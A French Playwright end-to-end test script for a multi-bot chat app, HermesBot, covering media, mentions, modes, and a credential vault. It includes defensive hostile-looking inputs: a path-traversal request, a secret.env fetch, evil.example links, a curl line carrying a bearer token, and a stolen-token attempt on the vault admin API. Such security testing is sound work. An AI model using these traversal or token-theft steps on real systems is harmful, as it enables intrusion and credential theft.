    if (await page.locator('.messages-scroll').getByText(hidden).count()) throw new Error(`« ${hidden} » est visible dans le chat.`)
  }
  await page.locator('.messages-scroll').getByText('Message glissé pendant le tour').waitFor({ timeout: 5_000 })
  await page.locator('.message-content a[href*="evil.example"]').waitFor({ timeout: 5_000 })
  if (await page.locator('.message-content img[src*="evil.example"]').count()) throw new Error('Image distante chargée.')
  if (await page.locator('.bot-row-preview').getByText('NOREPLY').count()) throw new Error('NOREPLY est visible dans le roster.')

  // Médias MEDIA: : galerie, vidéo lue avec Range, repli, visionneuse, jamais de texte brut ni de file://.
  await page.locator('.media-group.is-grid img.media-image').nth(1).scrollIntoViewIfNeeded()
  await page.waitForFunction(() => {
    const images = [...document.querySelectorAll('.media-group.is-grid img.media-image')]
    return images.length === 2 && images.every((image) => image.complete && image.naturalWidth > 0)
  }, null, { timeout: 5_000 })
  await page.waitForFunction(() => {
    const video = document.querySelector('video.media-video')
    return Boolean(video && video.readyState >= 1 && video.duration > 1)
  }, null, { timeout: 10_000 })
  if (!mediaRequests.some((item) => item.route === 'stream' && item.path === '/Users/test/videos/video.mp4' && item.range)) throw new Error('La vidéo n’est pas passée par /api/files/stream avec Range.')
  if (!mediaRequests.some((item) => item.route === 'download' && item.path === '/Users/test/visuels/slide 01.jpg' && item.profile === 'orion')) throw new Error('Image non relayée par /api/fs/download pour orion.')
  await page.locator('.media-fallback').getByText('absent.jpg').waitFor({ timeout: 5_000 })
  const rawMediaTag = await page.locator('.message-content p, .message-content .media-group').evaluateAll((nodes) => nodes.some((node) => node.textContent.includes('MEDIA:')))
  if (rawMediaTag) throw new Error('Une balise MEDIA: brute est visible dans le chat.')
  await page.locator('.message-content pre').getByText('MEDIA:/Users/test/exemple-de-syntaxe.png').waitFor()
  if (mediaRequests.some((item) => item.path.includes('exemple-de-syntaxe'))) throw new Error('Un exemple de code a été chargé comme média.')
  if (await page.locator('img[src^="file:"], video[src^="file:"], audio[src^="file:"]').count()) throw new Error('Un média est lu en file://.')
  await page.locator('.media-group.is-grid .media-thumb').first().click()
  await page.locator('.media-viewer img').waitFor({ timeout: 5_000 })
  await page.locator('.media-viewer-count').getByText('1 / 2').waitFor()
  await page.keyboard.press('ArrowRight')
  await page.locator('.media-viewer-count').getByText('2 / 2').waitFor()
  await page.waitForFunction(() => { const image = document.querySelector('.media-viewer img'); return image?.complete && image.naturalWidth > 0 }, null, { timeout: 5_000 })
  // Chrome sans interface ne produit d’image qu’à la demande : on attend la fin du fondu avant la capture.
  await page.waitForFunction(() => getComputedStyle(document.querySelector('.media-viewer')).opacity === '1', null, { timeout: 5_000 })
  await page.screenshot({ path: `${SCREENSHOTS}media-viewer.png` })
  await page.keyboard.press('Escape')
  await page.locator('.media-viewer').waitFor({ state: 'detached', timeout: 5_000 })
  await page.locator('.media-group.is-grid').scrollIntoViewIfNeeded()
  await page.screenshot({ path: `${SCREENSHOTS}media-chat.png` })
  // Fichiers cités par chemin, sans MEDIA: : lisibles sous le message, jamais ceux d’un bloc de code.
  const cited = page.locator('.message-assistant .cited-files')
  await cited.locator('.cited-files-label').getByText('3 fichiers cités').waitFor({ timeout: 5_000 })
  await page.waitForFunction(() => {
    const video = document.querySelector('.cited-files video.media-video')
    return Boolean(video && video.readyState >= 1 && video.duration > 1)
  }, null, { timeout: 10_000 })
  await page.waitForFunction(() => { const image = document.querySelector('.cited-files img.media-image'); return image?.complete && image.naturalWidth > 0 }, null, { timeout: 5_000 })
  await cited.locator('.media-fallback').getByText('absente.png').waitFor({ timeout: 5_000 })
  if (mediaRequests.some((item) => item.path.includes('exemple-cite'))) throw new Error('Un chemin d’un bloc de code a été chargé.')
  await cited.locator('.media-thumb').first().click()
  await page.locator('.media-viewer img').waitFor({ timeout: 5_000 })
  await page.keyboard.press('Escape')
  await page.locator('.media-viewer').waitFor({ state: 'detached', timeout: 5_000 })
  await page.locator('.messages-scroll').hover()
  await page.mouse.wheel(0, -200)
  await cited.evaluate((element) => element.scrollIntoView({ block: 'center' }))
  await delay(300)
  await page.screenshot({ path: `${SCREENSHOTS}cited-files.png` })
  // Mentions : @ ouvre la liste, Entrée choisit, la note part au bot, l’utilisateur ne voit que son texte.
  const orionBox = page.getByRole('textbox', { name: 'Message à Orion' })
  await page.locator('.message-user').getByText('Regarde avec').waitFor({ timeout: 5_000 })
  await page.locator('.message-user').getByText('[Fichier : ancien.pdf]').waitFor({ timeout: 2_000 })
  if (await page.locator('.messages-scroll').getByText('Bot Mode roster').count()) throw new Error('La note de mentions est visible après rechargement.')
  await orionBox.fill('Vois avec @to')
  await page.locator('.mention-menu').getByText('Nova', { exact: true }).waitFor({ timeout: 3_000 })
  if (await page.locator('.mention-menu').getByText('Orion', { exact: true }).count()) throw new Error('Le bot de la conversation est proposé.')
  await orionBox.press('Enter')
  await page.locator('.mention-menu').waitFor({ state: 'detached', timeout: 2_000 })
  if (await orionBox.inputValue() !== 'Vois avec @nova ') throw new Error('Mention mal insérée.')
  if (await page.locator('.message-user').getByText('Vois avec').count()) throw new Error('Entrée a envoyé au lieu de choisir le bot.')
  await orionBox.press('Enter')
  await page.locator('.message-user .mention-chip').getByText('@nova').last().waitFor({ timeout: 5_000 })
  await page.getByRole('button', { name: 'Envoyer' }).waitFor({ timeout: 5_000 })
  if (!lastPromptText.includes('@nova = agent profile "nova"') || !lastPromptText.includes('message_agent')) throw new Error('La note de mentions n’est pas partie.')
  if (await page.locator('.messages-scroll').getByText('Bot Mode roster').count()) throw new Error('La note de mentions est visible.')

  // Glisser-déposer : zone visible, images et fichiers joints, fichier vide refusé.
  await page.evaluate(() => {
    const transfer = new DataTransfer()
    for (const [name, type, body] of [['film.mp4', 'video/mp4', 'video'], ['dossier.pdf', 'application/pdf', 'pdf'], ['vignette.png', 'image/png', 'png'], ['vide.txt', 'text/plain', '']]) transfer.items.add(new File([body], name, { type }))
    window.__drop = transfer
    document.querySelector('.chat-panel').dispatchEvent(new DragEvent('dragenter', { bubbles: true, cancelable: true, dataTransfer: transfer }))
  })
  await page.locator('.drop-overlay').getByText('Dépose pour joindre à Orion').waitFor({ timeout: 2_000 })
  await page.screenshot({ path: `${SCREENSHOTS}drop-overlay.png` })
  await page.evaluate(() => document.querySelector('.chat-panel').dispatchEvent(new DragEvent('drop', { bubbles: true, cancelable: true, dataTransfer: window.__drop })))
  await page.locator('.drop-overlay').waitFor({ state: 'detached', timeout: 2_000 })
  await page.locator('.composer-file').getByText('film.mp4').waitFor({ timeout: 2_000 })
  await page.locator('.composer-file').getByText('dossier.pdf').waitFor({ timeout: 2_000 })
  await page.locator('.composer-image img[alt="vignette.png"]').waitFor({ timeout: 2_000 })
  await page.locator('.toast').getByText('vide.txt est vide').waitFor({ timeout: 2_000 })
  await page.locator('.toast button').click()
  // Le brouillon et ses fichiers restent sur leur bot.
  await orionBox.fill('Regarde ça')
  await page.locator('[data-bot=nova]').click()
  await page.locator('[data-bot=nova].is-selected').waitFor()
  if (await page.locator('.composer-file').count()) throw new Error('Les fichiers ont suivi sur un autre bot.')
  await page.locator('[data-bot=orion]').click()
  await page.locator('[data-bot=orion].is-selected').waitFor()
  await page.locator('.composer-file').getByText('film.mp4').waitFor({ timeout: 2_000 })
  if (await orionBox.inputValue() !== 'Regarde ça') throw new Error('Brouillon perdu au changement de bot.')
  await orionBox.press('Enter')
  await page.locator('.message-user').getByText('[Fichier : film.mp4]').last().waitFor({ timeout: 5_000 })
  for (let attempt = 0; attempt < 40 && !lastPromptText.includes('@file:attachments/dossier.pdf'); attempt += 1) await delay(50)
  if (fileAttachCalls.length !== 2 || imageAttachCalls.length !== 1) throw new Error(`Pièces jointes : ${fileAttachCalls.length} fichiers, ${imageAttachCalls.length} images.`)
  if (!fileAttachCalls[0].data_url?.startsWith('data:video/mp4;base64,') || fileAttachCalls[0].session_id !== 'chat-orion') throw new Error('file.attach mal formé.')
  if (!lastPromptText.includes('@file:attachments/film.mp4')) throw new Error('La référence du fichier n’est pas dans le prompt.')
  if (await page.locator('.messages-scroll').getByText('@file:').count()) throw new Error('Un @file: brut est visible.')
  await page.getByRole('button', { name: 'Envoyer' }).waitFor({ timeout: 5_000 })

  // Documents : onglets à côté du chat. HTML isolé, Markdown rendu, rien de distant ne se charge.
  await page.locator('.media-document').getByText('rapport.pdf').scrollIntoViewIfNeeded()
  await page.locator('.media-document').getByText('rapport.pdf').click()
  await page.locator('.rail-tab.is-active').getByText('rapport.pdf').waitFor({ timeout: 3_000 })
  await page.locator('.details-panel.has-document iframe[src*="rapport.pdf"]').waitFor({ timeout: 5_000 })
  await page.locator('.media-document').getByText('page.html').click()
  await page.locator('.rail-tab.is-active').getByText('page.html').waitFor({ timeout: 3_000 })
  const htmlFrame = page.frameLocator('iframe[sandbox="allow-scripts"]')
  await htmlFrame.getByText('Script local OK').waitFor({ timeout: 5_000 })
  await htmlFrame.locator('body[data-net]').waitFor({ timeout: 5_000 })
  if (await htmlFrame.locator('body').getAttribute('data-cookie') !== 'bloque') throw new Error('La page HTML lit les cookies de l’app.')
  if (await htmlFrame.locator('body').getAttribute('data-net') !== 'bloque') throw new Error('La page HTML a accès au réseau.')
  await page.locator('.media-document').getByText('note.md').click()
  await page.locator('.document-markdown h1').getByText('Note du bot').waitFor({ timeout: 5_000 })
  await page.locator('.document-markdown a[href*="evil.example"]').waitFor({ timeout: 2_000 })
  if (await page.locator('.rail-tab').count() !== 4) throw new Error('Il faut Le bot et trois documents en onglets.')
  await delay(350)
  await page.screenshot({ path: `${SCREENSHOTS}document-tabs.png` })
  await page.getByRole('button', { name: 'Fermer note.md' }).click()
  await page.locator('.rail-tab.is-active').getByText('page.html').waitFor({ timeout: 2_000 })
  await page.getByRole('button', { name: 'Fermer page.html' }).click()
  await page.getByRole('button', { name: 'Fermer rapport.pdf' }).click()
  await page.locator('.details-panel.has-document').waitFor({ state: 'detached', timeout: 2_000 })
  if (remoteRequests.length) throw new Error(`Chargement distant : ${remoteRequests[0]}`)

  // /api/document : session obligatoire, trois formats seulement, HTML sans origine ni réseau.
  const documentRoute = (file, profile = 'orion') => `http://127.0.0.1:4332/api/document?${new URLSearchParams({ profile, path: file })}`
  if ((await fetch(documentRoute('/Users/test/docs/note.md'))).status !== 401) throw new Error('/api/document sans session.')
  const documentHeaders = await page.evaluate(async (routes) => Promise.all(routes.map(async (route) => {
    const response = await fetch(route, { credentials: 'same-origin' })
    return { status: response.status, type: response.headers.get('content-type'), csp: response.headers.get('content-security-policy'), disposition: response.headers.get('content-disposition') }
  })), ['/Users/test/docs/page.html', '/Users/test/docs/rapport.pdf', '/Users/test/secret.env', '/Users/test/../etc/a.md'].map((file) => documentRoute(file).replace('http://127.0.0.1:4332', '')))
  if (documentHeaders[0].status !== 200 || !documentHeaders[0].csp.startsWith('sandbox allow-scripts;') || documentHeaders[0].csp.includes('allow-same-origin') || !documentHeaders[0].csp.includes("default-src 'none'")) throw new Error(`CSP HTML : ${JSON.stringify(documentHeaders[0])}`)
  if (documentHeaders[0].disposition !== 'inline') throw new Error('Une page HTML doit s’afficher en ligne.')
  if (documentHeaders[1].type !== 'application/pdf' || documentHeaders[1].csp.includes('sandbox')) throw new Error(`PDF : ${JSON.stringify(documentHeaders[1])}`)
  if (documentHeaders[2].status !== 415 || documentHeaders[3].status !== 400) throw new Error(`Filtres /api/document : ${JSON.stringify(documentHeaders.slice(2))}`)

  // Onglet Usage : compteurs de session.stats, répartition du contexte, historique du bot.
  await page.getByRole('tab', { name: 'Usage' }).click()
  await page.locator('.usage-context').getByText('4 %').waitFor({ timeout: 5_000 })
  await page.locator('.usage-stat').filter({ hasText: 'Cache lu' }).first().getByText('90k').waitFor({ timeout: 2_000 })
  await page.locator('.usage-stat').filter({ hasText: 'Appels API' }).first().getByText('14').waitFor({ timeout: 2_000 })
  await page.locator('.usage-row').getByText('Conversation').waitFor({ timeout: 2_000 })
  await page.locator('.usage-bars i').first().waitFor({ timeout: 2_000 })
  await page.locator('.usage-row').getByText('Opus 5.5').waitFor({ timeout: 2_000 })
  if (!analyticsProfiles.includes('orion')) throw new Error('L’historique n’a pas demandé le profil du bot.')
  await delay(300)
  await page.screenshot({ path: `${SCREENSHOTS}usage-tab.png` })
  await page.getByRole('tab', { name: 'Routines' }).click()

  // Modes : BRAIN et PLAN ajoutent une consigne pour ce tour seulement, EXEC n’ajoute rien.
  const modeRadio = (name) => page.getByRole('radio', { name, exact: true })
  const sendInMode = async (text) => {
    await orionBox.fill(text)
    await orionBox.press('Enter')
    for (let attempt = 0; attempt < 60 && lastPromptText !== text; attempt += 1) await delay(25)
    if (lastPromptText !== text) throw new Error(`Le texte stocké doit rester celui de l’utilisateur : ${lastPromptText}`)
    await page.locator('.composer-send[aria-label="Envoyer"]').waitFor({ state: 'attached', timeout: 3_000 })
  }
  if (await modeRadio('EXEC').getAttribute('aria-checked') !== 'true') throw new Error('EXEC doit être le mode par défaut.')
  await modeRadio('BRAIN').click()
  if (await orionBox.getAttribute('placeholder') !== 'Réfléchir avec Orion') throw new Error('Champ de saisie non adapté au mode.')
  await sendInMode('Test mode brain')
  if (!lastApiText?.startsWith('Test mode brain\n\n[HermesBot mode: BRAIN.') || !lastApiText.includes('Do not change files')) throw new Error(`api_text BRAIN : ${lastApiText}`)
  if (await page.locator('.messages-scroll').getByText('HermesBot mode').count()) throw new Error('La consigne du mode est visible.')
  await page.locator('[data-bot=nova]').click()
  await page.locator('[data-bot=nova].is-selected').waitFor()
  if (await modeRadio('EXEC').getAttribute('aria-checked') !== 'true') throw new Error('Le mode doit rester propre à chaque bot.')
  await page.locator('[data-bot=orion]').click()
  await page.locator('[data-bot=orion].is-selected').waitFor()
  if (await modeRadio('BRAIN').getAttribute('aria-checked') !== 'true') throw new Error('Mode perdu au retour sur le bot.')
  await modeRadio('PLAN').click()
  await sendInMode('Test mode plan')
  if (!lastApiText?.includes('[HermesBot mode: PLAN.')) throw new Error(`api_text PLAN : ${lastApiText}`)
  await modeRadio('EXEC').click()
  await sendInMode('Test mode exec')
  if (lastApiText !== undefined) throw new Error(`EXEC ne doit rien ajouter : ${lastApiText}`)
  await delay(300)
  await page.screenshot({ path: `${SCREENSHOTS}modes.png` })

  // Pendant le travail : le message rejoint le tour en cours, sinon il devient le suivant. Stop reste là.
  await orionBox.fill('Test pilotage')
  await orionBox.press('Enter')
  await page.getByRole('button', { name: 'Arrêter le bot' }).waitFor({ timeout: 3_000 })
  await orionBox.fill('Fais plutôt la version courte')
  await page.getByRole('button', { name: 'Envoyer' }).waitFor({ timeout: 2_000 })
  await orionBox.press('Enter')
  await page.locator('.message-user').getByText('Fais plutôt la version courte').waitFor({ timeout: 3_000 })
  for (let attempt = 0; attempt < 40 && !steerCalls.length; attempt += 1) await delay(25)
  if (steerCalls[0]?.text !== 'Fais plutôt la version courte' || steerCalls[0].execution_generation !== 1 || steerCalls[0].session_id !== 'chat-orion') throw new Error(`session.steer : ${JSON.stringify(steerCalls)}`)
  if (await orionBox.inputValue()) throw new Error('Le message envoyé reste dans le composer.')
  await page.getByRole('button', { name: 'Arrêter le bot' }).waitFor({ timeout: 1_000 })
  steerVerdict = { status: 'rejected', delivered: false, execution_generation: 1, authority_epoch: 1 }
  await orionBox.fill('Et ajoute le tableau')
  await orionBox.press('Enter')
  for (let attempt = 0; attempt < 40 && !queuedPrompts.length; attempt += 1) await delay(25)
  if (queuedPrompts[0] !== 'Et ajoute le tableau') throw new Error('Un message refusé par le tour doit partir comme tour suivant.')
  steerVerdict = { status: 'queued', execution_generation: 1, authority_epoch: 1 }
  await page.locator('.message-assistant').getByText('Pilotage terminé.').waitFor({ timeout: 4_000 })
  await page.getByRole('button', { name: 'Envoyer' }).waitFor({ state: 'attached', timeout: 3_000 }).catch(() => {})

  // Raccourcis : palette ⌘K, bot suivant Alt+↓, citation ⌘L, recherche ⌘F.
  await page.keyboard.press('Meta+k')
  await page.getByRole('textbox', { name: 'Chercher un bot' }).fill('tof')
  await page.locator('.palette-results').getByText('Nova', { exact: true }).waitFor({ timeout: 2_000 })
  await page.keyboard.press('Enter')
  await page.locator('[data-bot=nova].is-selected').waitFor({ timeout: 3_000 })
  await page.locator('.palette').waitFor({ state: 'detached', timeout: 2_000 })
  await page.keyboard.press('Alt+ArrowDown')
  await page.locator('[data-bot=orion].is-selected').waitFor({ timeout: 3_000 })
  await page.locator('.message-assistant').getByText('Pilotage terminé.').evaluate((node) => { const range = document.createRange(); range.selectNodeContents(node); const selection = window.getSelection(); selection.removeAllRanges(); selection.addRange(range) })
  await page.keyboard.press('Meta+l')
  if (await orionBox.inputValue() !== '> Pilotage terminé.\n\n') throw new Error(`Citation ⌘L : ${await orionBox.inputValue()}`)
  await orionBox.fill('')
  await page.keyboard.press('Meta+f')
  await page.getByRole('textbox', { name: 'Texte à rechercher' }).waitFor({ timeout: 2_000 })
  await page.getByRole('button', { name: 'Fermer la recherche' }).click()

  // Onglet Médias : ce que le bot a envoyé, documents compris, hors exemples de code.
  await page.getByRole('tab', { name: 'Médias' }).click()
  await page.locator('.media-library .media-document').getByText('note.md').waitFor({ timeout: 3_000 })
  await page.locator('.media-library img.media-image').first().waitFor({ timeout: 3_000 })
  if (await page.locator('.media-library').getByText('exemple-de-syntaxe').count()) throw new Error('Un exemple de code est listé dans les médias.')
  await page.locator('.media-library .media-document').getByText('rapport.pdf').click()
  await page.locator('.rail-tab.is-active').getByText('rapport.pdf').waitFor({ timeout: 3_000 })
  await page.getByRole('button', { name: 'Fermer rapport.pdf' }).click()
  await page.getByRole('tab', { name: 'Routines' }).click()

  // Thème sombre : même verre, capture de contrôle, puis retour au clair.
  await page.getByRole('button', { name: 'Passer au thème sombre' }).click()
  await page.waitForFunction(() => document.documentElement.dataset.theme === 'dark')
  await delay(400)
  await page.screenshot({ path: `${SCREENSHOTS}glass-dark.png` })
  await page.getByRole('button', { name: 'Passer au thème clair' }).click()
  await page.waitForFunction(() => document.documentElement.dataset.theme === 'light')

  // Tour en arrière-plan d’un bot déjà ouvert : « Au travail » tout de suite, puis « Terminé ».
  for (const client of wss.clients) send(client, event('chat-nova', 'message.start', { turn_id: 'turn-fond' }))
  await page.locator('[data-bot=nova] .bot-row-status.is-working').waitFor({ timeout: 3_000 })
  await page.locator('.working-strip.has-work').getByText('1 au travail').waitFor({ timeout: 3_000 })
  for (const client of wss.clients) send(client, event('chat-nova', 'message.complete', { turn_id: 'turn-fond', text: 'Travail de fond terminé.', status: 'complete' }))
  await page.locator('[data-bot=nova] .bot-row-status.is-done').waitFor({ timeout: 3_000 })

  // Résumé du travail : visible sur la ligne d’un bot en arrière-plan, sans non-lu avant la fin du tour.
  const novaBadge = page.locator('[data-bot=nova] .unread-badge')
  const unreadOf = async () => Number((await novaBadge.count()) ? await novaBadge.innerText() : 0)
  const unreadBeforeWork = await unreadOf()
  for (const client of wss.clients) {
    send(client, event('chat-nova', 'message.start', { turn_id: 'turn-resume' }))
    send(client, event('chat-nova', 'todo.updated', { revision: 1, todos: [{ id: '1', content: 'Relire le plan', status: 'completed' }, { id: '2', content: 'Écrire le résumé', status: 'in_progress' }] }))
  }
  await page.locator('[data-bot=nova] .bot-row-work').getByText('2/2 · Écrire le résumé').waitFor({ timeout: 7_000 })
  if (await unreadOf() !== unreadBeforeWork) throw new Error('Un non-lu est apparu pendant le travail.')
  for (const client of wss.clients) send(client, event('chat-nova', 'message.complete', { turn_id: 'turn-resume', text: 'Résumé écrit.', status: 'complete' }))
  await page.locator('[data-bot=nova] .bot-row-status.is-done').waitFor({ timeout: 3_000 })
  if (await unreadOf() !== unreadBeforeWork + 1) throw new Error('La fin du tour doit compter un seul non-lu.')

  // Sur le bot ouvert : une étape dans l’en-tête et le panneau, jamais la commande d’un terminal.
  for (const client of wss.clients) {
    send(client, event('chat-orion', 'message.start', { turn_id: 'turn-etape' }))
    send(client, event('chat-orion', 'tool.start', { tool_id: 'a', name: 'read_file', context: '/tmp/dossier/plan.md' }))
  }
  await page.locator('.work-card').getByText('Lit plan.md').waitFor({ timeout: 7_000 })
  await page.locator('.chat-status-detail').getByText('Lit plan.md').waitFor({ timeout: 2_000 })
  for (const client of wss.clients) send(client, event('chat-orion', 'tool.start', { tool_id: 'b', name: 'terminal', context: 'curl -H "Authorization: Bearer secret-test"' }))
  await page.locator('.work-card').getByText('Lance une commande').waitFor({ timeout: 7_000 })
  if (await page.getByText('secret-test').count()) throw new Error('La commande d’un terminal est affichée.')
  for (const client of wss.clients) send(client, event('chat-orion', 'message.complete', { turn_id: 'turn-etape', text: 'Étape terminée.', status: 'complete' }))
  await page.locator('.work-card').waitFor({ state: 'detached', timeout: 3_000 })

  // Coffre et accords : la gateway demande, l’app répond avec le même id, rien de secret ne reste.
  if (capabilityCalls === 0) throw new Error('client.capabilities n’a pas été annoncé.')
  const sheet = page.locator('.request-sheet')
  const ask = (id, method, params = {}) => { for (const client of wss.clients) send(client, { jsonrpc: '2.0', id, method, params: { session_id: 'chat-orion', ...params } }) }
  const answerOf = async (id) => {
    for (let attempt = 0; attempt < 40 && !clientResponses.has(id); attempt += 1) await delay(50)
    if (!clientResponses.has(id)) throw new Error(`Pas de réponse à ${id}.`)
    return clientResponses.get(id)
  }
  ask('srq-login', 'vault.save_login', { origin: 'https://exemple.test', site: 'exemple.test' })
  await sheet.getByText('https://exemple.test').waitFor({ timeout: 3_000 })
  await sheet.getByText('Orion a besoin de tes identifiants').waitFor()
  await page.getByLabel('Identifiant du site').fill('moi@exemple.test')
  await page.getByLabel('Mot de passe du site').fill('mot-de-passe-test')
  await delay(350)
  await page.screenshot({ path: `${SCREENSHOTS}vault-login.png` })
  await sheet.getByRole('button', { name: 'Enregistrer et continuer' }).click()
  const login = JSON.parse((await answerOf('srq-login')).result.value)
  if (login.identifier !== 'moi@exemple.test' || login.password !== 'mot-de-passe-test') throw new Error('Réponse du coffre incorrecte.')
  await sheet.waitFor({ state: 'detached', timeout: 2_000 })
  if (await page.getByText('mot-de-passe-test').count()) throw new Error('Le mot de passe est resté affiché.')
  if (await page.evaluate(() => JSON.stringify({ ...localStorage, ...sessionStorage }).includes('mot-de-passe-test'))) throw new Error('Le mot de passe a été stocké dans le navigateur.')
  ask('srq-code', 'vault.code', { site: 'exemple.test', hint: 'Code reçu par SMS' })
  await sheet.getByText('Code reçu par SMS').waitFor({ timeout: 3_000 })
  await sheet.getByRole('button', { name: 'Passer' }).click()
  if ((await answerOf('srq-code')).result.value !== '') throw new Error('Passer doit répondre une valeur vide.')
  ask('srq-unlock', 'vault.unlock_prompt', { backend: 'gestionnaire', display_name: 'Gestionnaire' })
  await sheet.getByText('Déverrouiller Gestionnaire').waitFor({ timeout: 3_000 })
  for (const client of wss.clients) send(client, event('chat-orion', 'request.cancel', { id: 'srq-unlock', method: 'vault.unlock_prompt', reason: 'timeout' }))
  await sheet.waitFor({ state: 'detached', timeout: 3_000 })
  ask('srq-ok', 'approval', { request_id: 'r1', command: 'commande de test', description: 'Action à valider', choices: ['once', 'session', 'deny'] })
  await sheet.getByText('commande de test').waitFor({ timeout: 3_000 })
  await sheet.getByRole('button', { name: 'Autoriser une fois' }).click()
  if ((await answerOf('srq-ok')).result.choice !== 'once') throw new Error('Choix d’accord incorrect.')
  await sheet.waitFor({ state: 'detached', timeout: 2_000 })
  ask('srq-non-gere', 'clarify', { question: 'Question ?' })
  if ((await answerOf('srq-non-gere')).error?.code !== -32601) throw new Error('Une demande non gérée doit être refusée tout de suite.')
  ask('srq-fenetre', 'terminal.read')
  if ((await answerOf('srq-fenetre')).error?.code !== 4404) throw new Error('Une demande de fenêtre doit répondre 4404.')
  // Une demande restée ouverte revient à la reprise de la session.
  openRequests = [{ id: 'srq-reprise', method: 'vault.code', params: { session_id: 'chat-nova', site: 'reprise.test' } }]
  await page.locator('[data-bot=nova]').click()
  await sheet.getByText('Code de vérification pour reprise.test').waitFor({ timeout: 5_000 })
  openRequests = []
  await sheet.getByLabel('Code', { exact: true }).fill('123456')
  await sheet.getByRole('button', { name: 'Valider' }).click()
  if ((await answerOf('srq-reprise')).result.value !== '123456') throw new Error('Code de reprise incorrect.')
  await sheet.waitFor({ state: 'detached', timeout: 2_000 })
  await page.locator('[data-bot=orion]').click()
  await page.locator('[data-bot=orion].is-selected').waitFor({ timeout: 3_000 })

  // Coffre CDP : API bots sur 4333, fenêtre locale sur 4332, gateway jamais destinataire.
  const vaultCall = async (action) => {
    const response = await fetch(`http://127.0.0.1:4333/v1/${action}`, {
      method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ bot: 'orion', target: 'onglet-steam' }),
      signal: AbortSignal.timeout(10_000),
    })
    const raw = await response.text()
    return { httpStatus: response.status, body: JSON.parse(raw), raw }
  }
  if ((await fetch('http://127.0.0.1:4332/api/browser-vault/events')).status !== 401) throw new Error('Les demandes du coffre sont lisibles sans session.')
  const missingTarget = await fetch('http://127.0.0.1:4333/v1/save', {
    method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ bot: 'orion' }),
  })
  if (missingTarget.status !== 400 || (await missingTarget.json()).error !== 'target_required') throw new Error('Un appel sans targetId doit être refusé.')
  const savingBrowser = vaultCall('save')
  const browserSheet = page.locator('.browser-vault-dialog')
  await browserSheet.getByText('https://store.steampowered.com', { exact: true }).waitFor({ timeout: 3_000 })
  await browserSheet.getByText('Orion a besoin de tes identifiants').waitFor()
  await browserSheet.getByLabel('Identifiant du site').fill('steam-test')
  await browserSheet.getByLabel('Mot de passe du site').fill(BROWSER_SECRET)
  await browserSheet.getByRole('button', { name: 'Enregistrer et continuer' }).click()
  const savedBrowser = await savingBrowser
  if (savedBrowser.httpStatus !== 200 || savedBrowser.body.status !== 'saved') throw new Error(`Enregistrement CDP refusé: ${savedBrowser.raw}`)
  if (savedBrowser.raw.includes(BROWSER_SECRET)) throw new Error('Le secret CDP est renvoyé au bot après save.')
  await browserSheet.waitFor({ state: 'detached', timeout: 2_000 })
  const listedBrowser = await vaultCall('list')
  if (listedBrowser.body.entries?.[0]?.identifier !== 'steam-test' || listedBrowser.raw.includes(BROWSER_SECRET)) throw new Error('list du coffre CDP incorrect.')
  // Rangé dans le trousseau (jetable ici), réservé au bot qui l’a demandé.
  const keychainDump = await execFileAsync('/usr/bin/security', ['dump-keychain', BROWSER_VAULT_KEYCHAIN])
  if (!keychainDump.stdout.includes('HermesBot') || !keychainDump.stdout.includes('"crtr"<uint32>="HBot"') || keychainDump.stdout.includes(BROWSER_SECRET)) throw new Error('Identifiant absent du trousseau.')
  const otherBot = await fetch('http://127.0.0.1:4333/v1/fill', {
    method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ bot: 'nova', target: 'onglet-steam' }),
  })
  if (otherBot.status !== 403 || (await otherBot.json()).error !== 'bot_not_allowed') throw new Error('Un autre bot utilise un identifiant qui ne lui est pas réservé.')
  const otherList = await fetch('http://127.0.0.1:4333/v1/list', {
    method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ bot: 'nova' }),
  })
  if ((await otherList.json()).entries?.length !== 0) throw new Error('Un bot voit les identifiants réservés à un autre.')
  // Un bot ne peut pas s’autoriser lui-même par l’API de l’app : jeton exigé, fichier en 0600.
  const selfGrant = (headers) => fetch('http://127.0.0.1:4333/admin/v1/entries', {
    method: 'POST', headers: { 'Content-Type': 'application/json', ...headers },
    body: JSON.stringify({ origin: 'https://store.steampowered.com', identifier: 'steam-test', bots: ['*'] }),
  })
  for (const headers of [{}, { Authorization: 'Bearer faux' }, { Authorization: `Bearer ${'0'.repeat(64)}` }]) {
    const refused = await selfGrant(headers)
    if (refused.status !== 403 || (await refused.json()).error !== 'admin_forbidden') throw new Error('API d’administration du coffre ouverte sans jeton.')
  }
  if ((await fetch('http://127.0.0.1:4333/admin/v1/entries')).status !== 403) throw new Error('Liste d’administration lisible sans jeton.')
  // Même avec le jeton (lisible par un bot du même compte), une écriture exige la session Hermes de l’utilisateur.
  const stolenToken = { Authorization: `Bearer ${readFileSync(BROWSER_VAULT_TOKEN, 'utf8').trim()}` }
  for (const headers of [stolenToken, { ...stolenToken, 'X-Hermes-Cookie': 'hermes_session=faux' }]) {
    const refused = await selfGrant(headers)
    if (refused.status !== 403 || (await refused.json()).error !== 'user_session_required') throw new Error('Écriture du coffre acceptée sans session Hermes.')
  }
  if ((await fetch('http://127.0.0.1:4333/admin/v1/entries', { headers: stolenToken })).status !== 200) throw new Error('Lecture des métadonnées refusée avec le jeton.')
  if (((await import('node:fs')).statSync(BROWSER_VAULT_TOKEN).mode & 0o777) !== 0o600) throw new Error('Jeton du coffre lisible par d’autres comptes.')
  const cliListed = await execFileAsync(process.execPath, ['scripts/browser-vault.mjs', 'list', '--bot', 'orion'], {
    cwd: new URL('..', import.meta.url), env: { ...process.env, HERMESBOT_VAULT_PORT: '4333' },
  })
  if (JSON.parse(cliListed.stdout).entries?.[0]?.identifier !== 'steam-test' || cliListed.stdout.includes(BROWSER_SECRET)) throw new Error('CLI du coffre CDP incorrect.')
  const cliFilled = await execFileAsync(process.execPath, ['scripts/browser-vault.mjs', 'fill', '--bot', 'orion', '--target', 'onglet-steam'], {
    cwd: new URL('..', import.meta.url), env: { ...process.env, HERMESBOT_VAULT_PORT: '4333' },
  })
  if (JSON.parse(cliFilled.stdout).status !== 'filled' || cdpInjections.at(-1).target !== 'onglet-steam') throw new Error('CLI fill ne respecte pas le targetId.')

  // Rechargement simulé : seuls les arguments CDP portent le secret, jamais le JavaScript évalué.
  cdpUrl = 'https://store.steampowered.com/login/?reloaded=1'
  const filledBrowser = await vaultCall('fill')
  if (filledBrowser.httpStatus !== 200 || filledBrowser.body.fields?.join() !== 'identifier,password') throw new Error(`Remplissage CDP refusé: ${filledBrowser.raw}`)
